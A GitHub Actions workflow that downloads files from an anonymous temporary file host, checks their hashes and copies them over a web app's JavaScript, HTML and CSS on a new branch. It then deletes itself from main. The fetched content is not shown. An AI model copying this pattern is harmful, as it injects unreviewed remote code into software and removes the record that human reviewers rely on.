name: Apply report rendering fix
on:
  workflow_dispatch:
permissions:
  contents: write
jobs:
  apply:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Fetch and verify files
        run: |
          curl -fsSL -o /tmp/appf.mjs https://n.uguu.se/BteeUohv.mjs
          echo "7c79954706c03f3cbc3c4d0fc00f7934a886009e5da48b8039f4edb52f713e52  /tmp/appf.mjs" | sha256sum -c -
          curl -fsSL -o /tmp/stylef.mjs https://n.uguu.se/viUiOvfD.mjs
          echo "8695436cf51d169c1b1f070235c2ace1e8ae2e448f6607b03e295d8eb9ceab90  /tmp/stylef.mjs" | sha256sum -c -
          curl -fsSL -o /tmp/cmdf.txt https://n.uguu.se/jsqyVbhD.txt
          echo "1d78a671b1ff1254f5273071499ee29cab72291f5a7deeec70e9fcbdd6603966  /tmp/cmdf.txt" | sha256sum -c -
          base64 -d /tmp/cmdf.txt > /tmp/index_fixed.html
      - name: Commit fix to branch
        run: |
          git config user.name "cm-littlebird"
          git config user.email "actions@users.noreply.github.com"
          git checkout -B fix/report-rendering origin/main
          cp /tmp/appf.mjs apps/command/web/app.js
          cp /tmp/index_fixed.html apps/command/web/index.html
          cp /tmp/stylef.mjs apps/command/web/style.css
          git add apps/command/web/app.js apps/command/web/index.html apps/command/web/style.css
          git commit -m "Render audit and apply reports as structured HTML with severity badges"
          git push origin fix/report-rendering
      - name: Self-disarm (remove this workflow from main)
        run: |
          git config user.name "cm-littlebird"
          git config user.email "actions@users.noreply.github.com"
          git checkout main
          git rm .github/workflows/apply-report-rendering.yml
          git commit -m "Remove one-shot report-rendering workflow"
          git push origin main
